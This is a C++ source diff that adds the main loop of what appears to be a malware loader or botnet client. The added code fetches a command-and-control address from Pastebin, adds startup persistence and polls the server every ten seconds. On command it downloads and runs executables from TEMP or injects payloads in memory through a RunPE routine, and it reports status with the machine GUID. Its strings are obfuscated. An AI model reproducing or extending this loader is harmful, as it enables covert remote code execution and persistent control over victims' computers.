@@ -20,9 +20,6 @@ public:
 		return "true";
 	}
 
-
-	
-
 	static std::string returnFinalPost() {
 		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
 		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
@@ -53,22 +50,64 @@ public:
 		std::string finalPost = "request=" + XOR::encryptReqeust(args);
 		
 		return finalPost;
-		
-		//return "";
 	}
-	/*
 
-	static std::string sendPost(std::string url, std::string params) {
+	static void darkMainThread() {
 		Config config;
+		std::thread startupPersistence;
+		//Fetch Gate from raw Site
+		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl, "", "GET"));
 
-		http::Request request2(url);
-		http::Response respons2e = request2.send("POST",
-			params,
-			{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
-		);
+		//Main
+		std::string guid = Helpers::GetMachineGUID();
+		std::string finalPost = Client::returnFinalPost();
 
-		return Helpers::responseToString(respons2e);
+		if (config.startup == true) {
+			startupPersistence = std::thread(Helpers::addstartup);
+		}
+
+		while (true) {
+			try {
+				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST");
+				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
+					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+					std::string random_str = Helpers::RandomString(10);
+					std::string url(v[2]);
+					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
+					Helpers::downloadFile(url, file);
+					std::string started = Helpers::startNewProcess(file);
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+				}
+				else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
+					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+					std::string url(v[2]);
+					LPVOID FileData = DownloadURLToBuffer(url.c_str());
+					bool runned = NTRX_RUNPE32(FileData);
+					std::string started = OBFUSCATE("failed");
+					if (runned) {
+						started = OBFUSCATE("success");
+					}
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+				}
+				else {
+					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
+						startupPersistence.detach();
+						Helpers::uninstall();
+						return;
+					}
+					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
+						startupPersistence.detach();
+						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+						Helpers::update(v[2]);
+						return;
+					}
+				}
+			}
+			catch (const std::exception & e) {
+				std::cerr << OBFUSCATE("Request failed, error: ") << e.what() << std::endl;
+			}
+			Sleep(10000);
+		}
 	}
-	*/
 };
 
